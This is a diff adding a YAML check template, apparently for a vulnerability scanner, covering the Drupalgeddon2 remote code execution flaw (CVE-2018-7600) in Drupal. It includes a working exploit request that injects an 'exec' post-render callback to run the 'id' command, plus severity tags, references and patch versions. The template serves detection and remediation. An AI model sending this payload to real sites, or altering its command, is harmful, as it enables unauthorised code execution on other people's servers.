@@ -1,0 +1,21 @@
+id: DRUPAL-SA-CORE-2018-002
+title: Drupalgeddon2 — Remote Code Execution (CVE-2018-7600)
+severity: critical
+http_request:
+  method: POST
+  path: /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax
+  body: "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id"
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+expected_response:
+  status: 200
+  body_contains: "ajax_dom_ready"
+cvss: 9.8
+cwe:
+  - CWE-20
+mitre:
+  - T1190
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2018-7600
+  - https://www.drupal.org/sa-core-2018-002
+remediation: Update Drupal to 7.58+, 8.3.9+, 8.4.6+, 8.5.1+.
